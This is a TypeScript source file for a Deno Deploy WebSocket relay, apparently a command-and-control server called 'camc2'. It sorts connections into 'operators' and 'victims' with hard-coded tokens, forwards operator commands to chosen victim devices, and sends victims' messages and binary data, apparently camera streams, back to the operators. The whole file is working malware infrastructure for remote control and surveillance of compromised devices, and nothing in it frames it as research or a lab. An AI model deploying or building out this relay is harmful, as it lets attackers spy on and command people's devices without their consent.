// main.ts — Deno Deploy WebSocket relay
const operators = new Set<WebSocket>();
const victims = new Map<string, WebSocket>();

Deno.serve((req) => {
  if (req.headers.get("upgrade") !== "websocket") {
    return new Response("camc2 alive", { status: 200 });
  }

  const url = new URL(req.url);
  const role = url.searchParams.get("role");
  const token = url.searchParams.get("token");

  const { socket, response } = Deno.upgradeWebSocket(req);

  socket.onopen = () => {
    console.log("connect:", role, token);

    if (role === "operator") {
      if (token !== "OP123") { socket.close(4001); return; }
      operators.add(socket);
    } else if (role === "victim") {
      if (token !== "DEV123") { socket.close(4002); return; }
      victims.set(token, socket);
    } else {
      socket.close(4000);
    }
  };

  socket.onmessage = (ev) => {
    if (role === "operator") {
      try {
        const m = JSON.parse(ev.data as string);
        const v = victims.get(m.deviceToken);
        if (v && v.readyState === WebSocket.OPEN) v.send(JSON.stringify(m.payload));
      } catch (e) { console.log("op err", e); }
    } else if (role === "victim") {
      if (typeof ev.data === "string") {
        try {
          const msg = JSON.parse(ev.data);
          for (const op of operators) if (op.readyState === WebSocket.OPEN)
            op.send(JSON.stringify({ deviceToken: token, payload: msg }));
        } catch {}
      } else {
        const buf = ev.data as ArrayBuffer;
        for (const op of operators) if (op.readyState === WebSocket.OPEN)
          op.send(buf);
      }
    }
  };

  socket.onclose = () => {
    operators.delete(socket);
    if (role === "victim" && token) victims.delete(token);
  };

  socket.onerror = (e) => console.log("err", e);

  return response;
});
